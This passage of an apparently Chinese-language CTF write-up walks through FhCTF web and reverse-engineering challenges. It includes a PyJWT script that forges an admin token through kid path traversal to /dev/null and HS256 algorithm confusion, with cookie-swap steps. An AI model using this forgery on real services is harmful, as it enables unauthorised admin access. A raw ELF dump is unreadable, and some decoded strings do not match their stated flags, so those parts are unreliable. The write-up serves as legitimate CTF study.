JWT。</p><ul><li>漏洞原理分析</li></ul><p>這題結合了兩個常見錯誤：<strong>Directory Traversal</strong> + <strong>JWT Algorithm Confusion</strong>。</p><ul><li><p>Directory Traversal (目錄遍歷)</p><p>後端實作概念大致類似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kid = header[<span class="string">&quot;kid&quot;</span>]</span><br><span class="line">key_path = <span class="string">&quot;/app/keys/&quot;</span> + kid</span><br><span class="line">key_data = <span class="built_in">open</span>(key_path, <span class="string">&quot;rb&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>若 <code>kid</code> 沒有過濾 <code>../</code>，攻擊者可以傳入像是：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../dev/null</span><br></pre></td></tr></table></figure><p>讓伺服器實際去開啟的路徑變成 <code>/dev/null</code>，而不是預期的 <code>/app/keys/default.pem</code>。<br>雖然我們看不到檔案內容，但伺服器會「自己」幫我們載入，並當成金鑰使用，這就是利用點。</p></li><li><p>JWT Algorithm Confusion (演算法混淆)</p><p>預期設計應該是：</p><ul><li>使用 <code>RS256</code>：<ul><li>使用非對稱金鑰（private key 簽發、public key 驗證）。</li><li><code>.pem</code> 應該被視為「公鑰」，只能用來驗證 Signature。</li></ul></li></ul><p>但現在伺服器支援 <code>HS256 Compatibility Mode</code>，實作類似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;RS256&quot;</span>:</span><br><span class="line">    <span class="comment"># 用 public key (pem) 驗證</span></span><br><span class="line"><span class="keyword">elif</span> header[<span class="string">&quot;alg&quot;</span>] == <span class="string">&quot;HS256&quot;</span>:</span><br><span class="line">    <span class="comment"># 仍然讀同一個 pem 檔案，但把整個內容當成 HMAC secret</span></span><br></pre></td></tr></table></figure><p>結果變成：</p><ul><li>當 <code>alg = HS256</code> 時，伺服器會把「原本是公鑰的 pem 檔內容」當成對稱金鑰（secret）來驗證 HMAC。</li><li>只要攻擊者「知道」這個 secret，就能在外面自己簽 Token。</li></ul><p>問題是：<code>default.pem</code> 的內容我們不知道，所以沒辦法直接利用；但目錄遍歷讓我們可以選擇「其他檔案」來當 secret。</p></li><li><p>攻擊思路設計</p><p>關鍵想法：</p><ol><li>找一個「內容已知」的系統檔案，讓伺服器把它讀進來當 HMAC secret。</li><li>對 Linux 來說，<code>/dev/null</code> 的內容就是空的，所以可以預期：<ul><li>程式讀取 <code>/dev/null</code> ⇒ 讀到空字串 <code>&quot;&quot;</code>。</li></ul></li><li>只要我們在本地端用「空字串」當 secret，就能產出與伺服器一致的 HS256 簽章。</li><li>再把 Payload 裡的 <code>role</code> 改成 <code>admin</code>，就可以偽造一個被伺服器接受的管理員 Token。</li></ol><p>因此攻擊步驟是：</p><ul><li>把 JWT Header 的：<ul><li><code>alg</code> 改為 <code>HS256</code></li><li><code>kid</code> 改為 <code>../../../../../../dev/null</code></li></ul></li><li>用 <code>key = &quot;&quot;</code> （空字串）簽 HMAC-SHA256，產生新的 Token。</li><li>將 Payload 中 <code>role</code> 改成 <code>admin</code>、甚至 <code>user</code> 改成 <code>admin</code>，達成提權。</li></ul></li><li><p>實作 Exploit（偽造 JWT）</p><p>以下使用 Python + PyJWT 生成偽造 Token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 惡意 Header：目錄遍歷指向 /dev/null，改用 HS256</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;../../../../../../dev/null&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 惡意 Payload：直接把角色改成 admin</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1704355555</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 簽名：密鑰為空字串，對應伺服器讀取 /dev/null 的結果</span></span><br><span class="line">forged_token = jwt.encode(</span><br><span class="line">    payload,</span><br><span class="line">    key=<span class="string">&quot;&quot;</span>,</span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    headers=headers</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;偽造的 Token:\n&quot;</span>, forged_token)</span><br></pre></td></tr></table></figure><p>步驟：</p><ol><li>從原本 Cookie 拿到合法 JWT，確認欄位名稱（例如 <code>role</code>、<code>user</code> 等）。</li><li>執行腳本，得到一個新的 <code>forged_token</code> 字串。</li><li>在瀏覽器中：<ul><li>F12 → Application → Cookies。</li><li>找到原本存 JWT 的 Cookie（例如 <code>access_token</code>）。</li><li>將其值整個替換為 <code>forged_token</code>。</li></ul></li><li>重新整理頁面。</li></ol><p>若後端如題目描述那樣實作，伺服器會：</p><ul><li>看到 <code>alg = HS256</code> → 用 HMAC 模式驗證。</li><li>看到 <code>kid = ../../../../../../dev/null</code> → 讀取 <code>/dev/null</code> 當作 secret（空字串）。</li><li>用空字串驗證 HMAC Signature，因為我們本地端也是用空字串簽的，所以驗證會通過。</li><li>Payload 裡 <code>role = admin</code>，因此認定我們是管理員。</li></ul></li></ul><p><img src="/img/FhCTF/23.webp" alt="image"><br><img src="/img/FhCTF/24.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5&#125;</span><br></pre></td></tr></table></figure><h3 id="Something-You-Put-Into"><a href="#Something-You-Put-Into" class="headerlink" title="Something You Put Into"></a>Something You Put Into</h3><p>檢視 <code>main.py</code>，可知flag是由系統設定取出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG = ChallSettings().flag</span><br></pre></td></tr></table></figure><p>確認 <code>ChallSettings()</code> 會從 env variable 中讀取 Flag。</p><p>檢查 Docker YAML 設定檔，可發現 Flag 以 plain text 形式存在環境變數設定中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;🐷B3_c4r3ful_y0ur_SQL_synt4x🐷&#125;</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="簡易腳本閱讀器"><a href="#簡易腳本閱讀器" class="headerlink" title="簡易腳本閱讀器"></a>簡易腳本閱讀器</h3><ul><li>先看PY，從第 2 行開始,跳過了 Flag<br><img src="/img/FhCTF/25.webp" alt="image"></li><li>用戶輸入可以修改列表中的任何位置<br><img src="/img/FhCTF/26.webp" alt="image"></li><li>JUMP 指令可以改變指令指針到任何索引<br><img src="/img/FhCTF/27.webp" alt="image"><br>那其實我們直接輸入 “JUMP 0” 就好了<br><img src="/img/FhCTF/28.webp" alt="image"></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;f1l3_10_and_jumb_m4st3r&#125;</span><br></pre></td></tr></table></figure><h3 id="OBF"><a href="#OBF" class="headerlink" title="OBF"></a>OBF</h3><p>先看code，使用了大量的混淆技術:</p><ul><li>變數單字母命名 (K, H, G, J, C 等)</li><li>簡化的內置函數 (A&#x3D;enumerate, E&#x3D;chr, F&#x3D;ord)</li><li>狀態機設計 (使用字典和指針)</li><li>魔法數字和字符串</li></ul><p>code實現了一個狀態機,按以下順序執行:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">狀態 1: XOR 66 解碼</span><br><span class="line">  資料: [58,34,118,...,34]</span><br><span class="line">  結果: &#x27;|`0|`.T1W0.`,`k`&#x27;</span><br><span class="line">  </span><br><span class="line">狀態 5: 字符串反向</span><br><span class="line">  資料: &#x27;wEGLxxnj0nbU2fsm&#x27;</span><br><span class="line">  反向: &#x27;msfU2bn0jnxxLGEw&#x27;</span><br><span class="line">  </span><br><span class="line">狀態 2: Base64 解碼</span><br><span class="line">  資料: &#x27;WEVBVldCWkM1UVBWQktHeA==&#x27;</span><br><span class="line">  解碼: &#x27;XEAVWBZC5QPVBKHX&#x27;</span><br><span class="line">  </span><br><span class="line">狀態 3: 字符減 5</span><br><span class="line">  資料: &#x27;GFVzRJI9IctWCFa[&#x27;</span><br><span class="line">  結果: &#x27;BAQuMED4D^oR&gt;A\V&#x27;</span><br><span class="line">  </span><br><span class="line">狀態 4: 驗證完成</span><br><span class="line">  檢查密鑰長度 &gt;= 64 ✓</span><br><span class="line">  完整密鑰 (64 字符)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|`0|`.T1W0.`,`k`BAQuMED4D^oR&gt;A\VXEAVWBZC5QP...</span><br></pre></td></tr></table></figure><p>這個密鑰是通過 4 部分組合而成:</p><ul><li>XOR with 66: |0|.T1W0.,<code>k</code> (16 字符)</li><li>字符 - 5: BAQuMED4D^oR&gt;A\V (16 字符)</li><li>Base64 解碼: XEAVWBZC5QPVBKHX (16 字符)</li><li>字符串反向: msfU2bn0jnxxLGEw (16 字符)</li></ul><p>解密過程<br>給定的加密輸出:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b</span><br></pre></td></tr></table></figure><p>使用密鑰進行 XOR 解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_pair, <span class="number">16</span>) ^ <span class="built_in">ord</span>(key[i % <span class="number">64</span>]))</span><br><span class="line">               <span class="keyword">for</span> i, hex_pair <span class="keyword">in</span> <span class="built_in">enumerate</span>(hex_pairs)])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;P0lym0rph1c_Crypt0&#125;</span><br></pre></td></tr></table></figure><h3 id="The-Lock"><a href="#The-Lock" class="headerlink" title="The Lock"></a>The Lock</h3><p>使用 IDA 靜態分析</p><h4 id="主函數-main-邏輯"><a href="#主函數-main-邏輯" class="headerlink" title="主函數 (main) 邏輯"></a>主函數 (main) 邏輯</h4><p>透過 IDA Pro 反編譯後，可以看到 main 函數的流程如下：<br>格式檢查 (check_header)：檢查輸入是否以 FhCTF{ 開頭並以 } 結尾。<br>核心驗證 (check_password)：這是最關鍵的函數，若回傳值為真，則代表 Flag 正確。</p><h4 id="驗證函數-check-password-分析"><a href="#驗證函數-check-password-分析" class="headerlink" title="驗證函數 (check_password) 分析"></a>驗證函數 (check_password) 分析</h4><p>進入 check_password 函數後，可以觀察到以下關鍵點：<br>字串處理：程式使用 substr 提取了花括號內的內容。<br>長度限制：內容長度必須正好為 26 個字元。<br>關鍵數據：<br>v6 (金鑰陣列): [85, 51, 102, 17]<br>v7 (目標數值陣列): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]<br>演算法公式：<br>$$v7[i] &#x3D; (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i$$</p><h4 id="演算法還原與逆向"><a href="#演算法還原與逆向" class="headerlink" title="演算法還原與逆向"></a>演算法還原與逆向</h4><p>為了得到原始輸入，我們需要將上述公式進行移項，反推 $\text{input}[i]$：<br>先處理加法偏移：$X &#x3D; v7[i] - 2 \times i$<br>再處理異或運算：$\text{input}[i] &#x3D; X \oplus v6[i \pmod 4]$<br>自動化解密腳本 (Python)<br>為了快速得到結果，我們編寫以下腳本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="number">7</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">47</span>, <span class="number">74</span>, <span class="number">97</span>, <span class="number">92</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">83</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">132</span>, <span class="number">127</span>, <span class="number">37</span>, <span class="number">116</span>, <span class="number">140</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">126</span>, <span class="number">87</span>, <span class="number">54</span>]</span><br><span class="line">key = [<span class="number">85</span>, <span class="number">51</span>, <span class="number">102</span>, <span class="number">17</span>]</span><br><span class="line"></span><br><span class="line">flag_content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">    <span class="comment"># 逆向公式：(v7[i] - 2*i) XOR v6[i%4]</span></span><br><span class="line">    char_code = (target[i] - <span class="number">2</span> * i) ^ key[i % <span class="number">4</span>]</span><br><span class="line">    flag_content += <span class="built_in">chr</span>(char_code)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Flag: FhCTF&#123;&#123;<span class="subst">&#123;flag_content&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="最終結果"><a href="#最終結果" class="headerlink" title="最終結果"></a>最終結果</h4><p>經過腳本執行，花括號內的字串為 J3v3rs3_Eng1n33r1ng_1sOar7。<br>Flag 內容分析：該字串是 Leet Speak 形式的「Reverse Engineering Is Art」。</p><p>最終答案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;R3v3rs3_Eng1n33r1ng_1s_Ar7&#125;</span><br></pre></td></tr></table></figure><h3 id="壞掉的解碼器"><a href="#壞掉的解碼器" class="headerlink" title="壞掉的解碼器"></a>壞掉的解碼器</h3><p>給了兩個檔案<br><img src="/img/FhCTF/a.webp" alt="{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}"><br>其中encrypted_flag裡有<br><img src="/img/FhCTF/b.webp" alt="{58654F7F-3F17-4FA5-AEAC-649927D2FA73}"><br>decrypt裡有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ELF          &gt;          @       ?          @ 8 </span><br><span class="line"> @         @       @       @       ?      ?                                                                                        ?      ?                                        !       !                                                                     X-      X=      X=      ?      @                   h-      h=      h=                                 8      8      8      0       0                    h      h      h      D       D              S廞d   8      8      8      0       0              P廞d   d       d       d       \       \              Q廞d                                                  R廞d   X-      X=      X=      ?      ?             /lib64/ld-linux-x86-64.so.2               GNU   ?           ?                   GNU e諲p6N)L？         GNU                                 ?!            胗姲r?%mC慝驧?C                        &#123;                     d                      ?                     ?                      ?                     ?                      d                     u                     ?                     ?                      ^                     F                                                                    ,                       ?                     ?  &quot;                   ?     `A            ?     B              &quot;  ?      ?       T    @@             __gmon_start__ _ITM_deregisterTMCloneTable _ITM_registerTMCloneTable _ZSt17__istream_extractRSiPcl _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_ _ZSt3cin _ZNSolsEPFRSoS_E _ZSt4cerr _ZSt21ios_base_library_initv _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _ZSt4cout fgets __stack_chk_fail fopen strlen __isoc23_strtol __libc_start_main __cxa_finalize fclose fputc libstdc++.so.6 libc.so.6 GLIBCXX_3.4.29 GLIBCXX_3.4.32 GLIBCXX_3.4 GLIBC_2.38 GLIBC_2.4 GLIBC_2.34 GLIBC_2.2.5                                ?     @   y?    ?     B?   ?     t)?   ?        ?         ??        ii</span><br><span class="line">        ??        ui	   #      X=             `      `=                    @             @      ?                    ?                    ?                    ?         </span><br><span class="line">           ?                    ?                    @@                    `A                    B                    ?                     ?                     ?                     ?                     ?                      ?                     ?          	           ?                     ?                     ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ?H??  Ht粀?     5J/  %L/  @ ?    殪f   橏f   樲f   斢f   憸f   ?f   ?f    廨f   嶵f	   嬙f?%?  fD  ??%?  fD  ??%?  fD  ??%?  fD  ??%~.  fD  ??%v.  fD  ??%n.  fD  ??%f.  fD  ??%^.  fD  ??%V.  fD  ??%N.  fD  ??檌^HH癚TE1?亍??  ;.  灀.?     H?Y.  H?R.  H9黂H?.  Ht	?    ?    H?).  H?&quot;.  H)H鍔?H霞H韆毤tH??  Ht趒D  ?    ??=e1   u+UH??   HtH??  ??鋄?=1  ]? ?    ?w?HH轣? i鴦N艷90  %H?H? ]鏤HH駍E?    ??釓?)?禧?? 壁?E?H?? u?E鏤H?E?貸?E?輾???貸   +E?輾??礑鏤HH H輤輤霂?H齴H轣H輤陊  H?H? t,H轣H輤?? &lt;</span><br><span class="line">t妲轣H輤?? &lt;</span><br><span class="line">t?卍?HHP  dH?%(   H?隨?[  HH??  H??H?蹥HH??  H噮  H?:  HH?[,  H??H?蹧HH?b-  H駉  H?蹥H?  HH??H?瞰H瞰 u5H??  HH??.  H閫?H??  HH韏??   嬐  H?瞰H?媻?   H駗?HtH?瞰H銶??   ?  H?媻H鋃?H?瞰H?膣?   H??Ht ?膣 H?膣H??H?瞰H??H?蹧H?9  HH??H?H u5H?  HH?I-  H鞊?H??  HH餈??   嶧  H?膣H???渾f?渮  ?軷 H?媻H遯?H?唅H?軾    濎   H?媻H?軾H?? ?渮H?軾H?媻?缿H?渮?   ?    H鋓??欲?欲?荻?欲?   駏??欲H?渾H???H純H錘 錘 鎂)?????壺0??荻?渾???欲H?H韐?H?軾H?軾H;??H?H輘??    H鷣H+%(   t遰?卍?HH H輤詡?H轣轣詡輤H鄫?H駓?   ?H?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Input Filename:  Output Filename:  r Error opening input file. w Error opening output file.  ;X   </span><br><span class="line">   潘?   l??   |??   ?t   ??   7?  |?$  梃D   ?d  n??         zR x ?        &amp;    D     $   4   (??    FJw ?9*3$&quot;       \   堆              t   剁?              ?   ?2    E?C</span><br><span class="line">i       ?   +?E    E?C</span><br><span class="line">|       ?   P?5    E?C</span><br><span class="line">l       ?   e?o    E?C</span><br><span class="line">f        渤N   E?C</span><br><span class="line">E     ,  碠?    E?C</span><br><span class="line">v                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    `                    ?             ?                    </span><br><span class="line">                    X=                           `=                    蘥o    ?             ?             ?      </span><br><span class="line">       /                                          h?             ?                             </span><br><span class="line">              ?                    	                            ?o          ?o    X      o           ?o    (      ?o                                                                                           h=                      0      @      P      `      p            ?      ?      ?      ?                                                              @      GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0                                  ?                	     ?                  ?                     ?                    ?              3                    I                  U     `=              |     `              ?     X=              ?    ?                ?     `              ?     a                  b                  ?                L    &quot;                   ?                Z     d               m    h=              v    h?              ?  &quot;  ?      ?       ?    @              ?      @              ?                   ?  &quot;                   ?                         ?      N                           X   @              e          o       y                                      ?          &amp;       ?    ?      5       ?                     ?                                          &quot;    i      2       3                     N                  T   @              `                     r                     ?    @@            ?    ?      E       ?     @              ?                  ?    @@              ?                     ?                     </span><br><span class="line">                     7                      S    `A            h                      w                      ?    B            ?                      Scrt1.o __abi_tag crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.0 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry decrypt.cpp _ZNSt8__detail30__integer_to_chars_is_unsignedIjEE _ZNSt8__detail30__integer_to_chars_is_unsignedImEE _ZNSt8__detail30__integer_to_chars_is_unsignedIyEE __FRAME_END__ __GNU_EH_FRAME_HDR _DYNAMIC _GLOBAL_OFFSET_TABLE_ _ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_ _edata _IO_stdin_used __cxa_finalize@GLIBC_2.2.5 strlen@GLIBC_2.2.5 main _ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4 __dso_handle _Z13removeNewlinePc _fini __libc_start_main@GLIBC_2.34 _Z11rotateRighthi _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4 fclose@GLIBC_2.2.5 _ZNSolsEPFRSoS_E@GLIBCXX_3.4 _Z10getNextKeyRj __stack_chk_fail@GLIBC_2.4 _init __TMC_END__ fopen@GLIBC_2.2.5 fputc@GLIBC_2.2.5 _ZSt4cout@GLIBCXX_3.4 _Z12generateSeedPKc __data_start _end __bss_start _ZSt21ios_base_library_initv@GLIBCXX_3.4.32 fgets@GLIBC_2.2.5 _ZSt17__istream_extractRSiPcl@GLIBCXX_3.4.29 _ITM_deregisterTMCloneTable _ZSt3cin@GLIBCXX_3.4 __gmon_start__ _ITM_registerTMCloneTable _ZSt4cerr@GLIBCXX_3.4 __isoc23_strtol@GLIBC_2.38  .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt.got .plt.sec .text .fini .rodata .eh_frame_hdr .eh_frame .init_array .fini_array .dynamic .data .bss .comment                                                                                                                            #              8      8      0                              6              h      h      $                              I              ?      ?                                     W   ?o       ?      ?      8                             a             ?      ?                                 i             ?      ?      /                             q   o       (      (      ,                            ~   ?o       X      X      ?                             ?             ?      ?                                  ?      B       </span><br><span class="line">      </span><br><span class="line">      ?                           ?                                                         ?                           ?                             ?             ?      ?                                   ?             ?      ?      ?                             ?                         ?                             ?                         </span><br><span class="line">                              ?                             c                              ?             d       d       \                              ?             ?      ?      L                             ?             X=      X-                                   ?             `=      `-                                   ?             h=      h-                                   ?             h?      h/      ?                                          @       0                                                @@      0      X              @                    0               0      +                                                   @0      p     </span><br></pre></td></tr></table></figure><p>提供ELF二進位檔decrypt與加密檔案encrypted_flag，需逆向分析解密邏輯並實作Python腳本取得flag 。透過strings與函數符號識別關鍵演算法，包括generateSeed、getNextKey、rotateRight等</p><ul><li>靜態分析</li></ul><p>執行strings decrypt顯示程式讀取input&#x2F;output檔案，使用fopen、fgets、fputc，並依賴libstdc++與libc符號如__stack_chk_fail、__libc_start_main。符號表揭示核心函數：</p><ul><li>generateSeed：從password生成初始seed，使用seed &#x3D; seed * 31 + ch的hash方式，模0xFFFFFFFF。</li><li>getNextKey：LCG偽隨機產生器，公式(seed * 0x41C64E6D + 0x3039) &amp; 0x7FFFFFFF，key &#x3D; seed % 255。</li><li>rotateRight：右旋位移，rotate_right(byte, 3)。</li><li>main：讀取hex字串，對每byte執行旋轉→更新seed→XOR key→seed +&#x3D; 原byte。</li></ul><p>ELF片段顯示hex資料”2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5”與password提示”I_just_afraid_someday_i_will_forget_the_password”。</p><ul><li>邏輯還原</li></ul><p>解密流程為每byte獨立處理：</p><ol><li>hex解析為byte b。</li><li>b_rot &#x3D; rotate_right(b, 3)，即(b &gt;&gt; 3) | (b &lt;&lt; 5) &amp; 0xFF。</li><li>seed &#x3D; getNextKey(seed)。</li><li>key &#x3D; seed % 255。</li><li>plaintext_byte &#x3D; b_rot ^ key。</li><li>seed &#x3D; (seed + b) &amp; 0xFFFFFFFF（注意加原始b，非旋轉後）。</li></ol><p>此與常見流密碼不同，seed更新依賴原始密文，形成依賴鏈</p><ul><li>解密腳本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">hexline = (<span class="string">&quot;2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7&quot;</span></span><br><span class="line">           <span class="string">&quot;9686098C6A5F0593D395543ABFF118410B2F02CF61FA5&quot;</span>)</span><br><span class="line">password = <span class="string">&quot;I_just_afraid_someday_i_will_forget_the_password&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_seed</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s.encode():</span><br><span class="line">        seed = (seed * <span class="number">31</span> + ch) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_next_key</span>(<span class="params">seed: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (seed * <span class="number">0x41C64E6D</span> + <span class="number">0x3039</span>) &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_right</span>(<span class="params">byte: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((byte &gt;&gt; n) | ((byte &lt;&lt; (<span class="number">8</span> - n)) &amp; <span class="number">0xFF</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">seed = generate_seed(password)</span><br><span class="line">out = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hexline), <span class="number">2</span>):</span><br><span class="line">    b = <span class="built_in">int</span>(hexline[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    b_rot = rotate_right(b, <span class="number">3</span>)</span><br><span class="line">    seed = get_next_key(seed)</span><br><span class="line">    key = seed % <span class="number">255</span></span><br><span class="line">    out.append(b_rot ^ key)</span><br><span 